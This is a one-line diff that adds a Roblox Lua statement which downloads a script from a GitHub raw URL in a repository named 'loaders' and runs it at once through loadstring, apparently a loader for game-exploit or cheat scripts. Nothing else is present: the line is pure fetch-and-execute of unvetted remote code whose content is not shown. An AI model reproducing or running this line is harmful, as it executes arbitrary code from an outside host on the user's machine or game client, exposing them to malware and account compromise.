@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/wanted-update-spam0-jzo7555hhhpqt6.lua"))()
